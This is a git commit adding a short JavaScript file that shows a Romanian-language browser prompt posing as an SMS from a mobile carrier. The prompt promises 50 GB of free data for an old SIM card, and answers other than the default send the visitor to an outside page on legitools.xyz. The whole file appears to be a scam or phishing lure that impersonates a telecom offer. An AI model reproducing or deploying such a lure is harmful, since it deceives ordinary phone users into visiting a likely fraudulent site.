885eb50c97ba00a3ac4f58456113f019f9596aab
katemj25 <mbokofficial1@gmail.com>
2025-05-06 17:26:49 -0700

    Create activate-orange-freeoffer.js

---
+++ activate-orange-freeoffer.js
@@ -0,0 +1,5 @@
+var password = 'Oferta de date gratuite'
+password=prompt('SMS: Felicitări Numărul dvs. este eligibil pentru a primi 50 GB gratuit de date 3G, 4G și 5G RECOMPENSA CARD SIM VECHIE, vă rugăm să apăsați OK pentru a ACTIVA. ','Oferta de date gratuite');
+if (password != 'Oferta de date gratuite') {
+location.href='https://legitools.xyz/mtcsim-upgrade.10gbdata.html';
+}
